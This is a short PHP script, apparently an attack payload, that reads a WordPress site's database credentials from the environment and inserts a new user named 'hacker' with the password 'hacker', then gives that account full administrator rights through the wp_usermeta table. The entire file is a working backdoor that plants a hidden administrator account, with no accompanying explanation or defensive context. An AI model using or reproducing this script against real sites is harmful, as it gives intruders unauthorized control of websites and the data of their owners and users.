<?php 
 $servername=getenv('WORDPRESS_DB_HOST');
 $username=getenv('WORDPRESS_DB_USER');
 $password=getenv('WORDPRESS_DB_PASSWORD');
 $db=getenv('WORDPRESS_DB_NAME');
 //connection to mysql
 $conn=mysqli_connect($servername,$username,$password, $db);
 if(!$conn)
 {
	 die("Connection Failed".mysql_error());
 }

 $sql = "INSERT INTO wp_users (ID,user_login,user_pass,user_nicename,user_email,user_url,user_registered,user_activation_key,user_status,display_name) VALUES ('3','hacker',MD5('hacker'),'hacker','hacker@inbox.lt','http://localhost','2022-04-12','',0,'hacker')";
 if ($conn->query($sql) === TRUE) {
   echo "New user created successfully\n";
 } else {
   echo "Error while creating user\n";
 }
 $sql = "INSERT INTO wp_usermeta (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, '3', 'wp_capabilities', 'a:1:{s:13:\"administrator\";b:1;}'), (NULL, '3', 'wp_user_level', '10'), (NULL, '3', 'show_welcome_panel', '1')";
  if ($conn->query($sql) === TRUE) {
   echo "New usermeta created successfully\n";
 } else {
   echo "Error while creating usermeta\n".$sql."<br>".$conn->error;
 }
 mysqli_close($conn);
?>
